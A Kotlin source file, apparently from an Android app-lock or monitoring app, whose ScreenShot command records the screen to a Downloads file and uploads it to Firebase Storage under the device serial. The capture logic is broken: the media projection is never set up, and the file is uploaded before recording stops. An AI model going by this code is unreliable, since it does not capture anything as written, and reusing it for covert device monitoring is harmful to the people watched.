package aldwin.tablante.com.appblock.Commands

import android.content.Context
import android.graphics.drawable.GradientDrawable
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.net.Uri
import android.os.Environment
import android.view.View
import android.view.Window
import android.widget.Toast
import com.google.android.gms.common.api.ApiException
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import java.io.File
import java.io.IOException
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class ScreenShot {

    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var videoUri = ""
    fun doshot(serial: String, context: Context) {


        var width = 720
        var height = 1080

        videoUri = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +
                StringBuilder("/Applock_").append(serial).append(".mp4").toString()

        mediaRecorder = MediaRecorder()
        mediaRecorder!!.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mediaRecorder!!.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mediaRecorder!!.setVideoSize(width, height)
        mediaRecorder!!.setOutputFile(videoUri)
        mediaRecorder!!.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder!!.setVideoEncodingBitRate(512 * 1000)
        mediaRecorder!!.setVideoFrameRate(30)


        mediaRecorder!!.prepare()


        Toast.makeText(context, videoUri.toString(), Toast.LENGTH_SHORT).show()


        mediaRecorder!!.start()
        Thread.sleep(2000)
        var storage = FirebaseStorage.getInstance().getReference()
        var mstorage: StorageReference = storage.child("images/users/" + serial)

        videoUri = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +
                StringBuilder("/Applock_").append(serial).append(".mp4").toString()
        var file = Uri.fromFile(File(videoUri))


        mstorage.putFile(file)


        mediaRecorder!!.stop()
        mediaRecorder!!.reset()
        mediaRecorder!!.release()

    }


}